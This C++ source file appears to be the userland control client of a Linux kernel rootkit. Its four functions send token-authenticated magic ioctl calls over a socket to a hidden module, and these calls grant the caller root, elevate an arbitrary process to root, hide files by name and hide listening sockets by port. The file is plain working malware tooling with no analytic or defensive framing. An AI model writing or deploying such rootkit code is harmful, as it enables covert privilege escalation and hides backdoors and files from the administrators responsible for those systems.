#include "api.h"

int root_me() {
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        std::cerr << "Error creating socket\n";
        return -1;
    }

    s_args args;
    args.cmd = ROOT_ME;
    int io = ioctl(sockfd, AUTH_TOKEN, &args);
    
    close(sockfd);
    return 1;
}

int set_proc_root(pid_t pid) {
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        std::cerr << "Error creating socket\n";
        return -1;
    }
    
    s_args args;
    args.cmd = 1;
    args.ptr = &pid;
    int io = ioctl(sockfd, AUTH_TOKEN, &args);

    close(sockfd);
    return 1;
}

int hide_filename(const char *fname) {
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        std::cerr << "Error creating socket\n";
        return -1;
    }

    s_args args;
    char buf[MAX_BUF_SIZE];
    std::memset(buf, 0, sizeof(buf));
    std::strncpy(buf, fname, sizeof(buf) - 1);
    
    args.cmd = 2;
    args.ptr = buf;
    int io = ioctl(sockfd, AUTH_TOKEN, &args);

    close(sockfd);
    return 1;
}

int hide_listening_socket(unsigned short portnum) {
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        std::cerr << "Error creating socket\n";
        return -1;
    }

    s_args args;
    args.cmd = 3;
    args.ptr = &portnum;
    int io = ioctl(sockfd, AUTH_TOKEN, &args);

    close(sockfd);
    return 1;
}
